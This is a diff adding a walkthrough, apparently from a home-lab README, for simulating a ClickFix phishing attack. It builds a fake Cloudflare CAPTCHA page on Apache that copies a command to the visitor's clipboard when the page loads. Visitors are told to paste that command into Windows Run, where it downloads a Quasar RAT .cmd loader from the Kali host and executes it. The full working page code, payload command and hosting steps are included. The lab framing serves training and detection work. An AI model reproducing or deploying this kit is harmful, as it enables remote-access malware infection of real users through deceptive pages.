@@ -55,3 +55,194 @@ Repeat the same for **Windows VM**.
 ![win 1](https://github.com/user-attachments/assets/f9596035-b02e-4e1d-8ab7-a5e244cc00b1)
 ![win 2](https://github.com/user-attachments/assets/7b4ee105-c5f3-4772-b54f-5f05e9905dd2)
 
+## Tool Installation
+
+**Kali Linux:**
+```bash
+sudo apt update
+sudo apt install apache2 curl unzip -y
+```
+
+**Windows**
+  - System Informer
+  - FakeNet-NG
+  - YARA (for Windows)
+  - YARA Forge
+
+ ## Quasar RAT Sample
+   - Malware Hash: bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2
+  - Source: MalwareBazaar 
+  - File Format: .cmd loader script (ClickFix-style)
+
+## Phase 1: Setup Fake Cloudflare CAPTCHA Page
+
+**1.Start and Enable Apache service:**
+```bash
+sudo systemctl start apache2
+sudo systemctl enable apache2
+```
+
+**2. Create the Fake Cloudflare Phishing Directory**
+Now, create a folder to host your fake ClickFix page:
+```bash
+sudo mkdir -p /var/www/html/clickfix
+cd /var/www/html/clickfix
+```
+
+**3. Create the Fake Cloudflare HTML Page**
+Create a file named index.html in that directory:
+```bash
+sudo nano index.html
+```
+
+Paste the following HTML code inside index.html:
+```bash
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Just a moment...</title>
+  <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .cf-container {
+      display: inline-block;
+      background: #ffffff;
+      padding: 30px 50px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 600px;
+    }
+
+    .cf-logo {
+      width: 60px;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f90;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .verify-box {
+      background: #fff6e5;
+      border-left: 5px solid orange;
+      text-align: left;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 80px;
+      font-size: 13px;
+      margin-top: 10px;
+      resize: none;
+    }
+
+    .btn {
+      margin-top: 20px;
+      background-color: #f90;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #e68a00;
+    }
+
+  </style>
+</head>
+<body onload="copyPayload()">
+
+  <div class="cf-container">
+    <img src="https://www.cloudflare.com/favicon.ico" class="cf-logo" alt="Cloudflare Logo">
+    <h2>Just a moment...</h2>
+    <div class="spinner"></div>
+    <p>pumpfun.exposed is checking your browser before accessing...</p>
+
+    <div class="verify-box">
+      <b>To verify you're not a robot, follow these steps:</b>
+      <ol>
+        <li>Press <b>Windows Key + R</b></li>
+        <li>Paste the copied command (<b>Ctrl + V</b>)</li>
+        <li>Press <b>Enter</b></li>
+      </ol>
+      <p><i>"I am not a robot" - reCAPTCHA Verification ID: <b>8731</b></i></p>
+      <textarea id="payloadBox" readonly></textarea>
+    </div>
+
+    <button class="btn" onclick="alert('Command copied to clipboard! Now press Win + R and Ctrl + V')">VERIFY</button>
+  </div>
+
+  <script>
+    function copyPayload() {
+      const payload = `cmd /c start /min cmd.exe /c "curl -L http://192.168.56.109/clickfix/Quasar.cmd -o %temp%\\verification.txt.bat && call %temp%\\verification.txt.bat"`;
+      document.getElementById("payloadBox").value = payload;
+
+      const input = document.createElement("textarea");
+      input.value = payload;
+      document.body.appendChild(input);
+      input.select();
+      document.execCommand("copy");
+      document.body.removeChild(input);
+    }
+  </script>
+
+</body>
+</html>
+```
+ - Save and exit the editor: Press Ctrl+O then Enter to save, then Ctrl+X to exit.
+
+**4. Place the Payload Executable**
+You need the fake RAT payload renamed as ClickFix.exe
+  - I already have the Quasar RAT as Quasar, move or copy it to /var/www/html/clickfix/:
+```bash
+sudo cp ~/Downloads/Quasar.cmd /var/www/html/clickfix/
+```
+
+
+**5. Restart Apache to Load Changes**
+```bash
+sudo systemctl restart apache2
+```
+**6. Find Kali Linux Host-Only IP**
+Run on Kali:
+```bash
+ip a
+```
+  - Look for your Host-only adapter (usually eth1 or enp0s8), find the IPv4 address, something like 192.168.56.X.
+## Phase 2: Phishing Execution
+
+**Step 2.1: On Windows Victim**
+  - Open browser → http://192.168.56.109/clickfix/
+
+  - Copy Run command → press Win + R → paste → Enter
+
+The command silently downloads and executes the Quasar .cmd RAT.
+
+![run in run](https://github.com/user-attachments/assets/bc8bf52f-ad6d-4988-8fa6-3c47b68c9ca2)
+
